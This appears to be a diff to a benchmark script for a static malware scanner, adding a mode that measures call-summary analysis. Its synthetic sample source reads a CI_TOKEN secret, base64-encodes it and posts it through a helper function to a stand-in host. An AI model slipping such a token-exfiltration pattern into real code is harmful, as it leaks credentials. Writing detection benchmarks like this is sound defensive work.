@@ -8,7 +8,11 @@ import json
 import tempfile
 from pathlib import Path
 
-from malir.benchmark import benchmark_dataflow_ablation, benchmark_scan
+from malir.benchmark import (
+    benchmark_call_summary_ablation,
+    benchmark_dataflow_ablation,
+    benchmark_scan,
+)
 from malir.scanner import Scanner
 
 SAFE_SOURCE = """\
@@ -31,6 +35,19 @@ def never_called():
     requests.post("https://example.invalid", data=data)
 """
 
+SUMMARY_SOURCE = """\
+import base64
+import os
+import requests
+
+def transmit(payload):
+    requests.post("https://example.invalid", data=payload)
+
+def never_called():
+    value = os.getenv("CI_TOKEN")
+    transmit(base64.b64encode(value.encode()))
+"""
+
 
 def main() -> int:
     parser = argparse.ArgumentParser()
@@ -39,17 +56,24 @@ def main() -> int:
     mode = parser.add_mutually_exclusive_group()
     mode.add_argument("--no-dataflow", action="store_true")
     mode.add_argument("--compare-dataflow", action="store_true")
+    mode.add_argument("--compare-summaries", action="store_true")
     args = parser.parse_args()
     with tempfile.TemporaryDirectory(prefix="malir-bench-") as directory:
         root = Path(directory)
+        suspicious = SUMMARY_SOURCE if args.compare_summaries else SUSPICIOUS_SOURCE
         for index in range(args.files):
-            source = SUSPICIOUS_SOURCE if index % 20 == 0 else SAFE_SOURCE
+            source = suspicious if index % 20 == 0 else SAFE_SOURCE
             (root / f"sample_{index:05d}.py").write_text(
                 source,
                 encoding="utf-8",
             )
         if args.compare_dataflow:
             output = benchmark_dataflow_ablation(root, repeats=args.repeats)
+        elif args.compare_summaries:
+            output = benchmark_call_summary_ablation(
+                root,
+                repeats=args.repeats,
+            )
         else:
             output = benchmark_scan(
                 root,
